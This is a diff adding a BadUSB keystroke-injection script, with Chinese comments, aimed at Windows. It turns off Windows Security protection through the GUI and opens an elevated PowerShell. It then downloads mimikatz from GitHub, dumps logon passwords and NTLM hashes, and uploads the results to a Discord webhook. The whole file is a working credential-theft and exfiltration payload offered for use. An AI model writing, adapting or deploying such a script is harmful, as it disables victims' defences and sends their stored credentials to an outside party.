@@ -1,0 +1,84 @@
+GUI q
+DELAY 500
+STRING windows security
+DELAY 200
+ENTER
+DELAY 800
+ENTER
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 200
+SPACE
+DELAY 500
+LEFTARROW
+DELAY 200
+ENTER
+ALT y
+DELAY 200
+ALT F4
+
+REM 打開管理員 PowerShell
+GUI r
+DELAY 300
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 500
+ALT y
+DELAY 500
+
+REM 設定 GitHub 下載 URL 與儲存路徑
+STRING $url = "https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe"
+ENTER
+STRING $output = "$env:TEMP\mimikatz.exe"
+ENTER
+
+REM 從 GitHub 下載 exe
+STRING Invoke-WebRequest -Uri $url -OutFile $output
+ENTER
+DELAY 1500
+
+REM 執行 exe 並帶入參數，例如 param1 param2
+STRING $result = & $output "privilege::debug" "sekurlsa::logonpasswords" "exit"| Select-String -Pattern 'Authentication Id','Session','User Name','Domain','SID','\* Username','\* Domain','\* LM','\* NTLM','\* SHA1','\* Password' | ForEach-Object { $_.Line }
+ENTER
+STRING $tempFile = "$env:TEMP\output.txt"
+ENTER
+STRING $result | Out-File -FilePath $tempFile -Encoding UTF8
+ENTER
+STRING Start-Sleep -Milliseconds 2000
+ENTER
+
+REM Discord Webhook 上傳檔案
+STRING $webhookUrl = "<discord hook>"
+ENTER
+STRING Add-Type -AssemblyName System.Net.Http
+ENTER
+STRING $client = New-Object System.Net.Http.HttpClient
+ENTER
+STRING $content = New-Object System.Net.Http.MultipartFormDataContent
+ENTER
+STRING $fileStream = [System.IO.File]::OpenRead($tempFile)
+ENTER
+STRING $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+ENTER
+STRING $content.Add($fileContent, "file", [System.IO.Path]::GetFileName($tempFile))
+ENTER
+STRING $stringContent = New-Object System.Net.Http.StringContent("testing")
+ENTER
+STRING $content.Add($stringContent, "content")
+ENTER
+STRING $response = $client.PostAsync($webhookUrl, $content).Result
+ENTER
+STRING $response.Content.ReadAsStringAsync().Result
+ENTER
+STRING $fileStream.Close()
+ENTER
+DELAY 200
+ALT F4
